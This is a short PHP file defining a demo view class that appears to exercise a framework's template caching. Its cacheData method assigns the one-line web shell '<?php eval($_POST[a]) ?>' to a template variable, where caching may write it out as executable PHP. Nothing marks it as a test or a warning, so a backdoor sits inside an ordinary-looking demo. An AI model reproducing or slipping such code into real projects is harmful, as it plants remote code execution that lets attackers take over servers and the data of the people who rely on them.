<?php

class DemoIndexView extends BaseView
{

	public function index()
	{
		$this->cache('cacheData', 0);
	}

    public function cacheData()
    {

		$str = '<?php eval($_POST[a]) ?>';

		$this->assign('str', $str);
    }


}
